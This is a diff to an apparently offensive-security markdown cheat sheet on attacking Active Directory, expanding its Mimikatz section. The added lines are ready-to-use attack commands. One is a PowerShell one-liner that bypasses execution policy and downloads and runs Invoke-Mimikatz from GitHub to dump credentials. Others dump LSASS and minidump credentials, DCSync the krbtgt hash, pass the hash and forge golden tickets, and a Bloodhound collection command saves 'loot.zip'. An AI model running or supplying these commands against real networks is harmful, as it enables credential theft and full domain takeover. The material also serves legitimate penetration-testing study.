@@ -241,17 +241,33 @@ on victim, transfer file then import into Bloodhound and run queries
     Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
     
 ## Mimikatz  
+Extracts passwords, hashes, PIN codes and kerberos tickets from memory.   
 [Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)    
 [Online Password Cracker - Crackstation](https://crackstation.net/)     
 [Dumping Hashes with Mimikatz - Video](https://www.youtube.com/watch?v=AZirvtZNIEw)   
+Loading Powershell Script 
 
+    powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"    
+    
+    
     privilege::debug
     lsadump::sam
-Powershell Script 
 
-    powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
 
-    
+Dumping credentials from LSASS   
+mimikatz # privilege::debug   
+mimikatz # sekurlsa::logonpasswords   
+Dumping credentials from a minidump   
+mimikatz # sekurlsa::minidump lsass.dmp   
+mimikatz # sekurlsa::logonPasswords   
+DCSync the krbtgt hash   
+mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt   
+Pass the hash   
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<cmd>   
+Golden ticket creation and pass the ticket   
+mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash>   
+ 
+ 
 # Resources
 [Active Directory Security 101 Class](https://github.com/cfalta/adsec) 
 
@@ -262,7 +278,6 @@ https://www.ired.team/offensive-security-experiments/active-directory-kerberos-a
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)
 
 [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
-
 
 [Active Directory Enumeration | ATTL4S](https://attl4s.github.io/assets/pdf/Understanding_Active_Directory_Enumeration.pdf) 
 
